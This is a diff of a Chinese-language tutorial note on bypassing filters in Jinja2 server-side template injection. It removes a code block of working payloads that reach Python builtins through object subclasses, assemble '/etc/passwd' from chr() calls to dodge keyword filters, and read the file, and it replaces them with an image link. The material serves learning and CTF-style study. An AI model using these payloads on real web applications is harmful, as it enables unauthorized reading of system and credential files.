@@ -450,14 +450,7 @@ __builtins__.eval()
 
 先获取chr()函数，赋值给chr，后面再拼接成一个字符串
 
-```
-{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
-
-# {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
-
-等同
-{{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
-```
+![image-20220919091230127](https://tuchuang.huamang.xyz/img/image-20220919091230127.png)
 
 ### 利用request对象绕过
 
